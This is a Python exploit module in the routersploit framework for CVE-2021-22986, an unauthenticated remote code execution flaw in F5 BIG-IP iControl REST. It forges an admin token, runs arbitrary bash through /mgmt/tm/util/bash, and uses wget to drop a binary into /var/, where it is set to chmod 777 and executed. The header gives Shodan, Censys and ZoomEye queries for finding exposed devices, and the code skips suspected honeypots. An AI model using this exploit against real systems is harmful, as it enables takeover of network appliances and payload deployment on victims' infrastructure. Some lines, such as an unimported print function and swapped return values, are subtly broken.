'''
Title: F5 BIG-IP 16.0.x - iControl REST Remote Code Execution (Unauthenticated)
Exploit link: https://www.exploit-db.com/exploits/49738
Version: 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2
CVE : CVE-2021-22986

censys search:services.http.response.headers.server="BigIP" and services.http.response.body=*F5*
zoomeye search: app:"F5 BIG-IP load balancer httpd" +after:"2022-01-01" +before:"2023-01-01"
shodan search: Server:BigIP
'''

from routersploit.core.exploit import shell
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.printer import log
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {'name': 'F5 BIG-IP 16.0.x'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def auth(self) -> tuple[bool, str]:
        headers = {
            "User-Agent": "hello-world",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "bigipAuthCookie": "",
            "username": "admin",
            "loginReference": {"link": "/shared/gossip"},
            "userReference": {"link": "https://localhost/mgmt/shared/authz/users/admin"}
        }
        response = self.http_request(
            method="POST", path='/mgmt/shared/authn/login',
            headers=headers, json=data,
            timeout=15
        )
        if response and "/mgmt/shared/authz/tokens/" in response.text:
            token = response.text.split('"selfLink":"https://localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0]
            return True, token
        # log.print_debug("Cannot receive token")
        return False, ''

    def execute(self, cmd: str) -> str:
        headers = {"Content-Type": "application/json", 'Connection': 'keep-alive, x-F5-Auth-Token', }
        token, status = self.auth()
        if status:
            headers.update({"X-F5-Auth-Token": token})
        else:
            headers.update(
                {
                    'X-F5-Auth-Token': 'a',
                    'Authorization': 'Basic YWRtaW46QVNhc1M=',
                    'User-Agent': 'hello-world',

                })

        data_json = {"command": "run", "utilCmdArgs": f"-c '{cmd}'"}
        response = self.http_request(
            method='POST',
            path='/mgmt/tm/util/bash',
            headers=headers,
            json=data_json,
            timeout=15
        )
        if response and response.status_code == 200 and 'commandResult' in response.text:
            return response.json()['commandResult']
        return ''

    def check(self):
        # signature check
        response = self.http_request(method='GET', path='/', allow_redirects=True)
        if response and 'F5_challenge' in response.text and not is_it_honeypot(response):
            return True
        return False

    def run(self):
        if self.check():
            print_success(f"Target {self.target}:{self.port} seams is vulnerable")
            shell(
                self,
                architecture="armle",
                method="wget",
                location="/var/",
                exec_binary=['chmod 777 {}', '{}']
            )
        else:
            print_error(f"Exploit failed - target {self.target}:{self.port} seems to be not vulnerable")
